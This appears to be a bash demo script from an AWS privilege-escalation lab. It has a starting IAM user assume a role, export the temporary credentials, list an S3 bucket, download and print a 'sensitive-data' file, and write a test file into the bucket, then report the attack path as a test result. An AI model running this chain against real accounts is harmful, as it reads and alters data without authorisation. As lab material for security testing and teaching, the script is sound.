#!/bin/bash

# Demo script for sts:AssumeRole to S3 bucket access
# This script demonstrates how a user can assume a role to gain access to a sensitive S3 bucket

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configuration
PROFILE="pl-pathfinder-starting-user-prod"
STARTING_USER="pl-pathfinder-starting-user-prod"
BUCKET_ACCESS_ROLE="pl-prod-one-hop-assumerole-bucket-access-role"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}STS AssumeRole to S3 Bucket Access Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Verify starting user identity
echo -e "${YELLOW}Step 1: Verifying identity as starting user${NC}"
CURRENT_USER=$(aws sts get-caller-identity --profile $PROFILE --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    echo "Please configure your AWS CLI profile '$PROFILE' to use the starting user credentials"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 2: Get account ID and construct bucket name
echo -e "${YELLOW}Step 2: Getting account ID and bucket information${NC}"
ACCOUNT_ID=$(aws sts get-caller-identity --profile $PROFILE --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"

# Get the bucket name from terraform output or construct it
BUCKET_NAME=$(aws s3api list-buckets --profile $PROFILE --query "Buckets[?starts_with(Name, 'pl-prod-one-hop-assumerole-bucket-')].Name" --output text 2>/dev/null || echo "")

if [ -z "$BUCKET_NAME" ]; then
    echo -e "${YELLOW}Note: Cannot list buckets with starting user (expected)${NC}"
    echo "Bucket name will be retrieved after assuming the role"
else
    echo "Target bucket: $BUCKET_NAME"
fi
echo -e "${GREEN}✓ Retrieved account information${NC}\n"

# Step 3: Verify limited permissions before role assumption
echo -e "${YELLOW}Step 3: Testing current permissions (should be limited)${NC}"
echo "Attempting to list S3 buckets..."
if aws s3 ls --profile $PROFILE 2>&1 | grep -q "AccessDenied\|operation: Access Denied"; then
    echo -e "${GREEN}✓ Confirmed limited permissions (cannot list S3 buckets)${NC}"
else
    echo -e "${YELLOW}Warning: May have more permissions than expected${NC}"
fi
echo ""

# Step 4: Assume the bucket access role
echo -e "${YELLOW}Step 4: Assuming role $BUCKET_ACCESS_ROLE${NC}"
ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${BUCKET_ACCESS_ROLE}"
echo "Role ARN: $ROLE_ARN"

CREDENTIALS=$(aws sts assume-role \
    --role-arn $ROLE_ARN \
    --role-session-name demo-bucket-access-session \
    --profile $PROFILE \
    --query 'Credentials' \
    --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')

# Verify we're now the role
ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $ROLE_IDENTITY"
echo -e "${GREEN}✓ Successfully assumed role${NC}\n"

# Step 5: Discover the target bucket
echo -e "${YELLOW}Step 5: Discovering target bucket${NC}"
if [ -z "$BUCKET_NAME" ]; then
    BUCKET_NAME=$(aws s3api list-buckets --query "Buckets[?starts_with(Name, 'pl-prod-one-hop-assumerole-bucket-')].Name" --output text)
fi
echo "Target bucket: $BUCKET_NAME"
echo -e "${GREEN}✓ Found target bucket${NC}\n"

# Step 6: List bucket contents
echo -e "${YELLOW}Step 6: Listing bucket contents${NC}"
echo "Contents of $BUCKET_NAME:"
aws s3 ls s3://$BUCKET_NAME/
echo -e "${GREEN}✓ Successfully listed bucket contents${NC}\n"

# Step 7: Download sensitive data
echo -e "${YELLOW}Step 7: Downloading sensitive data${NC}"
DOWNLOAD_FILE="/tmp/sensitive-data-${ACCOUNT_ID}.txt"
aws s3 cp s3://$BUCKET_NAME/sensitive-data.txt $DOWNLOAD_FILE

echo -e "\n${GREEN}✓ Successfully downloaded sensitive file${NC}"
echo -e "${YELLOW}Contents of sensitive file:${NC}"
cat $DOWNLOAD_FILE
echo ""

# Step 8: Verify write access (optional)
echo -e "${YELLOW}Step 8: Testing write access to bucket${NC}"
TEST_FILE="/tmp/test-write-${ACCOUNT_ID}.txt"
echo "Test file created during demo attack - $(date)" > $TEST_FILE
aws s3 cp $TEST_FILE s3://$BUCKET_NAME/demo-test-file.txt
echo -e "${GREEN}✓ Successfully wrote test file to bucket${NC}\n"

# Summary
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}Attack Summary${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "Starting Point: User ${YELLOW}$STARTING_USER${NC}"
echo -e "Step 1: Assumed role ${YELLOW}$BUCKET_ACCESS_ROLE${NC}"
echo -e "Step 2: Gained access to ${YELLOW}$BUCKET_NAME${NC}"
echo -e "Step 3: Successfully ${GREEN}read and wrote${NC} sensitive data"
echo ""
echo -e "${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER → (AssumeRole) → $BUCKET_ACCESS_ROLE → (S3 Access) → $BUCKET_NAME"
echo ""
echo -e "${GREEN}Downloaded file location: $DOWNLOAD_FILE${NC}"
echo ""

# Standardized test results output
echo "TEST_RESULT:prod_one_hop_to_bucket_sts_assumerole:SUCCESS"
echo "TEST_DETAILS:prod_one_hop_to_bucket_sts_assumerole:Successfully accessed S3 bucket via role assumption"
echo "TEST_METRICS:prod_one_hop_to_bucket_sts_assumerole:role_assumed=true,bucket_accessed=true,data_exfiltrated=true"
echo ""

# Cleanup instructions
echo -e "${YELLOW}To clean up temporary files:${NC}"
echo "  ./cleanup_attack.sh"
echo ""
